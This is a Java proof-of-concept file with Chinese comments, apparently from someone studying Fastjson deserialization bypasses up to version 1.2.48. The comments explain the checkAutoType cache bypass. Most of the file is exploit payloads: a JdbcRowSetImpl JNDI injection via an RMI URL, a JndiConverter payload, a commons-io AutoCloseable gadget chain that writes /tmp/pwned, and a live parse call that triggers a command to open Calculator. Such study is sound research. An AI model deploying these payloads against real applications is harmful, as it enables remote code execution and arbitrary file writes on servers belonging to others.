package Fastjson;

import com.alibaba.fastjson.JSON;

import java.io.IOException;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/15 17:16
 */
public class Fastjson1248 {
    public static void main(String[] args) throws IOException {
        /*
        相对于上一版本，将MiscCodec类的缓存设置为了false，不允许存储缓存
        通过阅读源码发现，ParserConfig.java中的checkAutoType()函数中，如果expectClassFlag=true
        那么就会loadClass，这是一个切入点
        Fastjson 1.2.48就是通过这个点进行处理的，想要expectClassFlag=true，需要满足：
        expectClass!=null && expectClass!= Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class
        当expectClassFlag=true的时候，我们会进入白名单验证，通过后进入loadClass()方法（cache=true），这里会将className放入mapping
        如果expoectClassFalg=false，会先从mapping中获取className，会进行黑名单的匹配，再进行白名单的匹配，如果黑名单没有白名单有，就会loadClass

        */

//        JndiConverter
//        String payload ="{{\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost/obj\",\"autoCommit\": true}}";
//        String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://localhost/obj\"}\"";

        /*
        {
            "@type":"java.lang.AutoCloseable",
            "@type":"org.apache.commons.io.input.XmlStreamReader",
            "is":{
            "@type":"org.apache.commons.io.input.TeeInputStream",
            "input":{
            "@type":"org.apache.commons.io.input.ReaderInputStream",
            "reader":{
            "@type":"org.apache.commons.io.input.CharSequenceReader",
            "charSequence":{"@type":"java.lang.String""aaaaaa"
            },
            "charsetName":"UTF-8",
            "bufferSize":1024
            },
            "branch":{
            "@type":"org.apache.commons.io.output.WriterOutputStream",
            "writer": {
            "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
            "file": "/tmp/pwned",
            "encoding": "UTF-8",
            "append": false
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024,
            "writeImmediately": true
            },
            "closeBranch":true
            },
            "httpContentType":"text/xml",
            "lenient":false,
            "defaultEncoding":"UTF-8"
            }

         */
//        String payload = "";
//        JSON.parse(payload);

        System.out.println(JSON.parseObject("{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.VulAutoCloseable\",\"open\":\"-a Calculator.app\"}\n"));
//        Runtime.getRuntime().exec("open -a Calculator.app");
    }
}
